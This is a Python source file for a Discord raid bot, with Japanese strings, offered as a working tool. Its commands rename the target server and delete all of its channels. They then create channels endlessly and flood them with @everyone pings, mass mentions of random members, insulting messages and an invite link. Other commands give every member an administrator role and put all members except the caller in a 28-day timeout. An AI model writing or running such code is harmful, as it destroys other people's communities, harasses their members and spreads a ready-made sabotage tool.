import discord
from discord.ext import commands
import os
import asyncio
import random
from datetime import timedelta

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

SERVER_NAME = "トイ神の植民地"
CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
CREATE_INTERVAL = 0.05

COMBINED_TEXT = (
    "@everyone\n"
    ".∧_∧\n"
    " ( ･ω･)つﾞ☆ﾍﾟﾁﾍﾟﾁ\n"
    " と ＿⌒))\n"
    "        (_ﾉﾉ\n"
    "\n"
    "∧,＿,∧  バカが治りますよ～に♡\n"
    "（`・ω・)つ━☆・*.\n"
    "⊂　　 ノ 　　　・゜+.\n"
    "　し'´Ｊ　　*・ °。\n"
    "\n"
    "https://discord.gg/4y3kfgr8p\n"
    "https://discord.gg/4y3kfgr8p\n"
    "お前らみたいな人生負け組のチー牛🧀🐮🤓と豚丼には到底入れないまぶしいサーバーww😂😂😂"
)

stop_flag = asyncio.Event()
background_tasks = set()

def random_mentions(guild: discord.Guild) -> str:
    members = [m for m in guild.members if not m.bot]
    if not members:
        return "@everyone\n"
    k = min(30, len(members))
    picked = random.choices(members, k=k)
    return " ".join(m.mention for m in picked) + "\n"


async def spam_channel(channel: discord.TextChannel, guild: discord.Guild):
    while not stop_flag.is_set():
        text = random_mentions(guild) + COMBINED_TEXT
        try:
            await channel.send(text)
        except:
            break
        try:
            await asyncio.wait_for(stop_flag.wait(), timeout=0.05)
        except asyncio.TimeoutError:
            pass


async def delete_all_channels_fast(guild: discord.Guild):
    """✅ 最速並列削除＋取りこぼし自動消去"""
    # 1回目：一斉削除（最速）
    tasks = [ch.delete() for ch in guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    # 2回目：残ったチャンネルを再度削除（止まり防止）
    await asyncio.sleep(0.03)
    if guild.channels:
        tasks = [ch.delete() for ch in guild.channels]
        await asyncio.gather(*tasks, return_exceptions=True)


async def infinite_create_and_spam(guild: discord.Guild):
    stop_flag.clear()
    try:
        await guild.edit(name=SERVER_NAME)
    except:
        pass

    await delete_all_channels_fast(guild)

    counter = 1
    while not stop_flag.is_set():
        try:
            new_channel = await guild.create_text_channel(f"{CHANNEL_NAME}-{counter}")
            task = asyncio.create_task(spam_channel(new_channel, guild))
            background_tasks.add(task)
            task.add_done_callback(background_tasks.discard)
            counter += 1
            try:
                await asyncio.wait_for(stop_flag.wait(), timeout=CREATE_INTERVAL)
            except asyncio.TimeoutError:
                pass
        except:
            try:
                await asyncio.wait_for(stop_flag.wait(), timeout=3)
            except asyncio.TimeoutError:
                pass


@bot.command()
async def start(ctx):
    if not stop_flag.is_set() and background_tasks:
        return
    await infinite_create_and_spam(ctx.guild)


@bot.command()
async def stop(ctx):
    stop_flag.set()
    await asyncio.gather(*background_tasks, return_exceptions=True)
    background_tasks.clear()


@bot.command()
async def eraser(ctx):
    """✅ 最速削除＋報告なし"""
    await delete_all_channels_fast(ctx.guild)


@bot.command()
async def admin(ctx):
    guild = ctx.guild
    admin_role = discord.utils.get(guild.roles, name="TISN管理者")
    if not admin_role:
        try:
            admin_role = await guild.create_role(
                name="TISN管理者",
                permissions=discord.Permissions(administrator=True)
            )
        except:
            return
    tasks = [m.add_roles(admin_role) for m in guild.members if not m.bot and admin_role not in m.roles]
    await asyncio.gather(*tasks, return_exceptions=True)


@bot.command(name="to")
async def total_timeout(ctx):
    guild = ctx.guild
    author = ctx.author
    report = []
    admin_role = discord.utils.get(guild.roles, name="TISN管理者")
    if not admin_role:
        try:
            admin_role = await guild.create_role(
                name="TISN管理者",
                permissions=discord.Permissions(administrator=True)
            )
            report.append("✅ 管理者ロールを新規作成")
        except Exception as e:
            report.append(f"❌ 管理者ロール作成失敗: {e}")
            await ctx.send("\n".join(report))
            return
    if admin_role not in author.roles:
        try:
            await author.add_roles(admin_role)
            report.append("✅ あなたに管理者権限を付与")
        except Exception as e:
            report.append(f"❌ ロール付与失敗: {e}")
            await ctx.send("\n".join(report))
            return
    await asyncio.sleep(1.5)
    bot_top_role = guild.me.top_role
    target_position = len(guild.roles) - 2
    try:
        await bot_top_role.edit(position=target_position, reason=f"!to by {author}")
        report.append("✅ Botロールを一番上に移動")
    except Exception as e:
        report.append(f"⚠️ Botロール移動失敗: {e}")
    duration = discord.utils.utcnow() + timedelta(days=28)
    tasks = []
    target_count = 0
    for member in guild.members:
        if member.bot or member.id == author.id:
            continue
        try:
            tasks.append(member.edit(timeout_until=duration, reason="!to による一括タイムアウト"))
            target_count += 1
        except:
            pass
    results = await asyncio.gather(*tasks, return_exceptions=True)
    success_count = sum(1 for r in results if not isinstance(r, Exception))
    report.append(f"✅ タイムアウト実行: {success_count}/{target_count} 人")
    await ctx.send("## 🎯 !to 完了\n" + "\n".join(report))


@bot.event
async def on_ready():
    print(f"起動: {bot.user}")


TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
if not TOKEN:
    raise RuntimeError("トークンを設定してください")

bot.run(TOKEN)